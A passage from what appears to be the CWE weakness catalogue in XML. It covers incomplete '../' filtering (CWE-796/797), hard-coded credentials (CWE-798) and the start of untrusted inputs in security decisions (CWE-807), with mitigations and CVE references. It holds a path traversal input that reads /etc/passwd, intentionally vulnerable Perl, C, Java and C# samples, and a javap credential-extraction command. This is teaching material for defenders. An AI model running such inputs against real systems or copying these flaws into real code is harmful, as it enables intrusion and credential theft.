               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-3">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter a "../" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/^\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression is only looking for an instance of "../" at the beginning of the string, it only removes the first "../" element. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="796" Name="Only Filtering Special Elements Relative to a Marker" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but only accounts for special elements positioned relative to a marker (e.g. "at the beginning/end of a string; the second argument"), thereby missing remaining special elements that may exist before sending it to a downstream component.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="795" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="795" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-3">
               <Intro_Text>The following code takes untrusted input and uses a regular expression to filter a "../" element located at the beginning of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>$Username =~ s/^\.\.\///;<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the regular expression is only looking for an instance of "../" at the beginning of the string, it only removes the first "../" element. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" stripped, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="797" Name="Only Filtering Special Elements at an Absolute Position" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The software receives data from an upstream component, but only accounts for special elements at an absolute position (e.g. "byte number 10"), thereby missing remaining special elements that may exist before sending it to a downstream component.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="795" View_ID="699" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="795" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Unexpected State</Impact>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-4">
               <Intro_Text>The following code takes untrusted input and uses a substring function to filter a 3-character "../" element located at the 0-index position of the input string. It then appends this result to the /home/user/ directory and attempts to read the file in the final resulting path.</Intro_Text>
               <Example_Code Nature="bad" Language="Perl">
                  <xhtml:div>my $Username = GetUntrustedInput();<xhtml:br/>if (substr($Username, 0, 3) eq '../') {<xhtml:div style="margin-left:10px;">$Username = substr($Username, 3);</xhtml:div>}<xhtml:br/>my $filename = "/home/user/" . $Username;<xhtml:br/>ReadAndSendFile($filename);</xhtml:div>
               </Example_Code>
               <Body_Text>Since the if function is only looking for a substring of "../" between the 0 and 2 position, it only removes that specific "../" element. So an input value such as:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>../../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>will have the first "../" filtered, resulting in:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>This value is then concatenated with the /home/user/ directory:</Body_Text>
               <Example_Code Nature="result">
                  <xhtml:div>/home/user/../../etc/passwd</xhtml:div>
               </Example_Code>
               <Body_Text>which causes the /etc/passwd file to be retrieved once the operating system has resolved the ../ sequences in the pathname. This leads to relative path traversal (CWE-22).</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         
      </Weakness>
      <Weakness ID="798" Name="Use of Hard-coded Credentials" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The software contains hard-coded credentials, such as a password or cryptographic key, which it uses for its own inbound authentication, outbound communication to external components, or encryption of internal data.</Description>
         <Extended_Description>
            <xhtml:p>Hard-coded credentials typically create a significant hole that allows an attacker to bypass the authentication that has been configured by the software administrator. This hole might be difficult for the system administrator to detect. Even if detected, it can be difficult to fix, so the administrator may be forced into disabling the product entirely. There are two main variations:</xhtml:p>
            <xhtml:div style="margin-left:10px;">
               <xhtml:div>Inbound: the software contains an authentication mechanism that checks the input credentials against a hard-coded set of credentials.</xhtml:div>
               <xhtml:div>Outbound: the software connects to another system or component, and it contains hard-coded credentials for connecting to that component.</xhtml:div>
            </xhtml:div>
            <xhtml:p>In the Inbound variant, a default administration account is created, and a simple password is hard-coded into the product and associated with that account. This hard-coded password is the same for each installation of the product, and it usually cannot be changed or disabled by system administrators without manually modifying the program, or otherwise patching the software. If the password is ever discovered or published (a common occurrence on the Internet), then anybody with knowledge of this password can access the product. Finally, since all installations of the software will have the same password, even across different organizations, this enables massive attacks such as worms to take place.</xhtml:p>
            <xhtml:p>The Outbound variant applies to front-end systems that authenticate with a back-end service. The back-end service may require a fixed password which can be easily discovered. The programmer may simply hard-code those back-end credentials into the front-end software. Any user of that program may be able to extract the password. Client-side systems with hard-coded passwords pose even more of a threat, since the extraction of a password from a binary is usually very simple.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="344" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="671" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="257" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
            <Paradigm Name="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>If hard-coded passwords are used, it is almost certain that malicious users will gain access to the account in question.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Read Application Data</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Other</Impact>
               <Note>This weakness can lead to the exposure of resources or functionality to unintended actors, possibly providing attackers with sensitive information or even execute arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Credential storage in configuration files is findable using black box methods, but the use of hard-coded credentials for an incoming authentication routine typically involves an account that is not visible outside of the code.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated white box techniques have been published for detecting hard-coded credentials for incoming authentication, but there is some expert disagreement regarding their effectiveness and applicability to a broad range of methods.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis</Method>
               <Description>This weakness may be detectable using manual code analysis. Unless authentication is decentralized and applied throughout the software, there can be sufficient time for the analyst to find incoming authentication routines and examine the program logic looking for usage of hard-coded credentials. Configuration files could also be analyzed.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Dynamic Analysis</Method>
               <Description>
                  <xhtml:p>For hard-coded credentials in incoming authentication: use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                  <xhtml:p>Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Network Sniffer</xhtml:li>
                           <xhtml:li>Forced Path Execution</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For outbound authentication: store passwords, keys, and other credentials outside of the code in a strongly-protected, encrypted configuration file or database that is protected from access by all outsiders, including other local users on the same system. Properly protect the key (CWE-320). If you cannot use encryption to protect the file, then make sure that the permissions are as restrictive as possible [REF-7].</xhtml:p>
                  <xhtml:p>In Windows environments, the Encrypted File System (EFS) may provide some protection.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>For inbound authentication: Rather than hard-code a default username and password, key, or other authentication credentials for first time logins, utilize a "first login" mode that requires the user to enter a unique strong password or key.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>If the software must contain hard-coded credentials or they cannot be removed, perform access control checks and limit which entities can access the feature that requires the hard-coded credentials. For example, a feature might only be enabled through the system console instead of through a network connection.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For inbound authentication using passwords: apply strong one-way hashes to passwords and store those hashes in a configuration file or database with appropriate access control. That way, theft of the file/database still requires the attacker to try to crack the password. When handling an incoming password during authentication, take the hash of the password and compare it to the saved hash.</xhtml:p>
                  <xhtml:p>Use randomly assigned salts for each separate hash that is generated. This increases the amount of computation that an attacker needs to conduct a brute-force attack, possibly limiting the effectiveness of the rainbow table method.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>For front-end to back-end connections: Three solutions are possible, although none are complete.</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:ul>
                        <xhtml:li>The first suggestion involves the use of generated passwords or keys that are changed automatically and must be entered at given time intervals by a system administrator. These passwords will be held in memory and only be valid for the time intervals.</xhtml:li>
                        <xhtml:li>Next, the passwords or keys should be limited at the back end to only performing actions valid for the front end, as opposed to having full access.</xhtml:li>
                        <xhtml:li>Finally, the messages sent should be tagged and checksummed with time sensitive values so as to prevent replay-style attacks.</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-13">
               <Intro_Text>The following code uses a hard-coded password to connect to a database:</Intro_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>DriverManager.getConnection(url, "scott", "tiger");<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>This is an example of an external hard-coded password on the client-side of a connection. This code will run successfully, but anyone who has access to it will have access to the password. Once the program has shipped, there is no going back from the database user "scott" with a password of "tiger" unless the program is patched. A devious employee with access to this information can use it to break into the system. Even worse, if attackers have access to the bytecode for application, they can use the javap -c command to access the disassembled code, which will contain the values of the passwords used. The result of this operation might look something like the following for the example above:</Body_Text>
               <Example_Code Nature="attack">
                  <xhtml:div>javap -c ConnMngr.class<xhtml:div style="margin-left:10px;">22: ldc #36; //String jdbc:mysql://ixne.com/rxsql<xhtml:br/>24: ldc #38; //String scott<xhtml:br/>26: ldc #17; //String tiger</xhtml:div>
                  </xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-14">
               <Intro_Text>The following code is an example of an internal hard-coded password in the back-end:</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (strcmp(password, "Mew!")) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>
                                 <xhtml:br/>printf("Incorrect Password!\n");<xhtml:br/>return(0)</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:10px;">if (passwd.Equals("Mew!")) {<xhtml:div style="margin-left:10px;">return(0)</xhtml:div>}<xhtml:br/>//Diagnostic Mode<xhtml:br/>return(1);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Every instance of this program can be placed into diagnostic mode with the same password. Even worse is the fact that if this program is distributed as a binary-only distribution, it is very difficult to change that password or disable this "functionality."</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-92">
               <Intro_Text>The following code examples attempt to verify a password using a hard-coded cryptographic key.</Intro_Text>
               <Example_Code Nature="bad" Language="C">
                  <xhtml:div>int VerifyAdmin(char *password) {<xhtml:div style="margin-left:10px;">
                        <xhtml:div>if (strcmp(password,"68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:10px;">
                              <xhtml:div>
                                 <xhtml:br/>printf("Incorrect Password!\n");<xhtml:br/>return(0);</xhtml:div>
                           </xhtml:div>}<xhtml:br/>printf("Entering Diagnostic Mode...\n");<xhtml:br/>return(1);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>public boolean VerifyAdmin(String password) {<xhtml:div style="margin-left:10px;">if (password.equals("68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:10px;">System.out.println("Entering Diagnostic Mode...");<xhtml:br/>return true;</xhtml:div>}<xhtml:br/>System.out.println("Incorrect Password!");<xhtml:br/>return false;</xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Example_Code Nature="bad" Language="C#">
                  <xhtml:div>int VerifyAdmin(String password) {<xhtml:div style="margin-left:10px;">if (password.Equals("68af404b513073584c4b6f22b6c63e6b")) {<xhtml:div style="margin-left:10px;">Console.WriteLine("Entering Diagnostic Mode...");<xhtml:br/>return(1);</xhtml:div>}<xhtml:br/>Console.WriteLine("Incorrect Password!");<xhtml:br/>return(0);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The cryptographic key is within a hard-coded string value that is compared to the password. It is likely that an attacker will be able to read the key and compromise the system.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-43">
               <Intro_Text>The following examples show a portion of properties and configuration files for Java and ASP.NET applications. The files include username and password information but they are stored in plaintext.</Intro_Text>
               <Body_Text>This Java example shows a properties file with a plaintext username / password pair.</Body_Text>
               <Example_Code Nature="bad" Language="Java">
                  <xhtml:div>
                     <xhtml:br/>
                     <xhtml:i># Java Web App ResourceBundle properties file</xhtml:i>
                     <xhtml:br/>...<xhtml:br/>webapp.ldap.username=secretUsername<xhtml:br/>webapp.ldap.password=secretPassword<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database but the pair is stored in plaintext.</Body_Text>
               <Example_Code Nature="bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:10px;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information and avoid CWE-260 and CWE-13.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2010-2772</Reference>
               <Description>SCADA system uses a hard-coded password to protect back-end database containing authorization information, exploited by Stuxnet worm</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2772</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-2073</Reference>
               <Description>FTP server library uses hard-coded usernames and passwords for three default accounts</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2073</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2010-1573</Reference>
               <Description>Chain: Router firmware uses hard-coded username and password for access to debug functionality, which can be used to execute arbitrary code</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1573</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2369</Reference>
               <Description>Server uses hard-coded authentication key</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2369</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0961</Reference>
               <Description>Backup product uses hard-coded username and password, allowing attackers to bypass authentication via the RPC interface</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0961</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1160</Reference>
               <Description>Security appliance uses hard-coded password allowing attackers to gain root access</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1160</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-7142</Reference>
               <Description>Drive encryption product stores hard-coded cryptographic keys for encrypted configuration files in executable programs</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-7142</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3716</Reference>
               <Description>VoIP product uses unchangeable hard-coded public credentials that cannot be changed, which allows attackers to obtain sensitive information</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3716</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3803</Reference>
               <Description>VoIP product uses hard coded public and private SNMP community strings that cannot be changed, which allows remote attackers to obtain sensitive information</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3803</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-0496</Reference>
               <Description>Backup product contains hard-coded credentials that effectively serve as a back door, which allows remote attackers to access the file system</Description>
               <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-0496</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC03-J</Entry_ID>
               <Entry_Name>Never hard code sensitive information</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-798</Entry_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="191"/>
            <Related_Attack_Pattern CAPEC_ID="70"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Key Management Issues&#34; Page 272"/>
            <Reference External_Reference_ID="REF-729"/>
            <Reference External_Reference_ID="REF-172"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-798"/>
         </References>
         
      </Weakness>
      <Weakness ID="807" Name="Reliance on Untrusted Inputs in a Security Decision" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The application uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.</Description>
         <Extended_Description>
            <xhtml:p>Developers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.</xhtml:p>
            <xhtml:p>Without sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Language-Independent" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Varies by Context</Impact>
               <Note>Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-10">
               <Method>Manual Static Analysis</Method>
               <Description>Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.</Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>The effectiveness and speed of manual analysis will be reduced if the there is not a centralized security mechanism, and the security logic is widely distributed throughout the software.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:10px;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:div style="margin-left:10px;">
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                     </xhtml:div>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
